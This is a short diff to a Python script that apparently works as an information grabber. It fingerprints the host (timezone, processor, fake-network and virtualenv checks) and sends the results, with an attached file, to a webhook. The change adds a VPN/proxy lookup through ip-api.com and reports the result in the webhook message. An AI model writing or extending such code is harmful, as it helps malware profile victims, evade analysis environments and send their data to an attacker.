@@ -37,6 +37,8 @@ now = datetime.datetime.now()
 local_now = now.astimezone()
 local_tz = local_now.tzinfo
 local_tzname = local_tz.tzname(local_now)
+vpn = get('http://ip-api.com/json?fields=proxy')
+proxy = vpn.json()['proxy']
 
 if hasattr(sys, 'real_prefix'):
     st = True
@@ -77,6 +79,7 @@ def sg():
  embed.add_embed_field(name="Local Timezone :", value=f"**{local_tzname}**", inline=True)
  embed.add_embed_field(name="Processor :", value=f"**{proc}**", inline=True)
  embed.add_embed_field(name="Fake Net :", value=f"**{fknet}**", inline=True)
+ embed.add_embed_field(name="VPN :",value=proxy)
  embed.set_footer(text=f"{time2}", icon_url="https://static.thenounproject.com/png/2256517-200.png")
  with open(f"{asr}", "rb") as f:
     webhook.add_file(file=f.read(), filename=f'./{asr}')
